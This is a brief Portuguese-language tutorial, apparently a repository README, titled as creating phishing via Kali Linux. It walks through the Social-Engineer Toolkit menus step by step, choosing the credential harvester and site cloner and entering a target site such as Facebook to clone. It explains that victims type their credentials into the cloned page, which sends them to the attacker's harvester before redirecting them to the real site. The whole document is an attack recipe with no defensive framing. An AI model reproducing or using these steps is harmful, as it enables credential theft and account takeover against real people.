Criação de phishing via KaliLinux

- > sudo su
- root # > setoolkit
*iniciara a ferramenta de ataque*
- set > 1 (Social Engineering)
-  set > 2 (Website Attack Vectors)
-  set:webattack> 3 (Credential Harvester Attack Method)
- set:webattack> 2 (Site Cloner)
*Obtenha o ip da maquina para o post back harvester*
- >ifconfig
- set:webattack> IP address for the POST back in Harvester/Tabnabbing [192.168.0.105]: (De enter)
- set:webattack> Enter the url to clone: (insira o http do site que você irá clonar ex: http//:facebook.com)

-  Agora digite no navegador o IP escolhido para manter nossa pagina web clone que utilizaremos para o ataque.

*Note que no Kali reports de atividades aparecerão assim que iniciarmos a conexão*

- Aqui (na nossa pagina clonada) o alvo irá preencher suas credenciais e enviar para o nosso harvester antes de ser redirecionada para uma pagina autêntica

*No Kali poderemos então visualizar os resultados da colheita de credenciais*

![image](https://github.com/user-attachments/assets/edd9d402-2d55-4298-883f-aef2947e172c)
